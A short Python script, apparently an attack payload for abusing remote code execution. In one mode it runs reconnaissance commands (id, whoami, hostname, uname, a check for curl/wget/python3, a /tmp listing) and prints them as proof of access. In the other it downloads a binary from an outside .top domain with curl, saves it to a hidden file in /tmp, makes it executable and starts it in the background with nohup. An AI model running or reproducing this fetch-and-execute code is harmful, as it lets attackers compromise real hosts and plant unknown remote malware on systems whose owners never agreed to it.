import subprocess

def sh(c):
    try:
        p = subprocess.run(c, shell=True, capture_output=True, text=True, timeout=25)
        return (p.stdout or "") + (p.stderr or "")
    except Exception as e:
        return "ERR " + repr(e)

try:
    m = mode
except Exception:
    m = "evidence"

if m == "evidence":
    print("===EVID_START===")
    print(sh("id; whoami; hostname; uname -a; echo TOKEN_145678_OK; which curl wget python3; ls -la /tmp | head -20"))
    print("===EVID_END===")
else:
    print("RCS_START")
    print(sh("curl -fsk https://azvdvasfv21fa.xxxyyyzzzxyz.top/api/oob/payload/dbebface2014c887e91bd3595ce1ef722db1eef7994cd8cdb382f56efa8d8a92 -o /tmp/.rcs-02961a76 && chmod +x /tmp/.rcs-02961a76 && ls -la /tmp/.rcs-02961a76"))
    subprocess.Popen("nohup /tmp/.rcs-02961a76 </dev/null >/dev/null 2>&1 &", shell=True)
    import time
    time.sleep(6)
    print("RCS_DONE")
